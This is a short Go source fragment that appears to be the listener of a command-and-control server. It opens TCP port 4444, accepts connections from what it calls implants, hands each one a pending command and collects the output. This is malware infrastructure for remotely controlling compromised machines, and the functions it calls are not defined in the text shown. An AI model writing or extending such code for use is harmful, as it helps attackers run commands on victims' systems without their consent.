package main

import (
	"log"
	"net"
)

func initalizeServer() {
	listen, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatal("[-] Error", err)
	}

	defer listen.Close()

	for {
		conn, err := listen.Accept()
		if err != nil {
			log.Println(" [-] Error accepting connection")
			continue
		}
		go handleImplants(conn)
	}
}

func handleImplants(conn net.Conn) {
	defer conn.Close()
	if pendingCommand != "" {
		sendCommands(conn)
		pendingCommand = ""
		receiveOutput(conn)
	} else {
		conn.Write([]byte("NO_COMMAND"))
	}
	receiveOutput(conn)
}
